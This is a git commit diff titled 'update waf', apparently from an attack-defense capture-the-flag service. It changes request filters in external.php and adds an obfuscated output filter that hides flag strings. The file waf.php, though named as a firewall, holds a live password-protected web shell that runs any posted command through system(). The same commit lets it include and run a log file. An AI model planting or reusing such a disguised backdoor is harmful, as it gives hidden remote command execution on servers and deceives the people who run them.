8f54cce6664da4a80635d366097b27b29f034692
racterub <racterub@gmail.com>
2022-02-13 11:18:05 +0800

    update waf

--- 21/external.php
+++ 21/external.php
@@ -1,21 +1,22 @@
 <?php
-/*if(isset($_POST['url'])){
- $u=$_POST['url'];if(!strpos($u,'http')!==0)die();
-}
-foreach ($_REQUEST as $k => $v) {
-$_REQUEST[$k]=preg_replace("/['\\\\]/",'',$v);
-$_REQUEST[$k]=preg_replace("/flag/",'',$v);
-}*/
-/*
 if(isset($_POST['url']) && (substr($_POST['url'],0,strlen("http"))!=="http")) die();
-foreach ($_REQUEST as $k => $v) {
-$_REQUEST[$k]=preg_replace("/kill/",'',$v);
-}*/
 
-if (isset($_POST['url']) && strpos($_POST['url'],'http')!==0) die(sleep(300));
 foreach ($_REQUEST as $k => $v) {
-    if (preg_match('/flag|\'|\\\\/', $_REQUEST[$k])) die(sleep(300));
     $_REQUEST[$k]=preg_replace("/kill/",'',$v);
 }
+
+foreach ($_REQUEST as $k => $v) {
+    if (preg_match('/flag|\'|\\\\|kill/', $_REQUEST[$k])) die(sleep(300));
+}
+
 if ($_SERVER['CONTENT_TYPE'] == 'application/xml')
     die(sleep(300));
+
+function c($b){
+    if(strlen($b) == 0)return $b;
+    $p = array(str_rot13('/RBS').'\{.{5}/');
+    $r = array(str_rot13("RBS{").substr(md5(microtime()),rand(0,26),5));
+    return preg_replace($p, $r, $b);
+}
+
+ob_start(chr(99));
--- 21/waf.php
+++ 21/waf.php
@@ -1,3 +1,2 @@
 <?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="20557e9cb0b97727acba7b67560662c160507758"){@system($_POST["w"]);die();}
 @include_once "/var/www/html/logs/w";
-die();
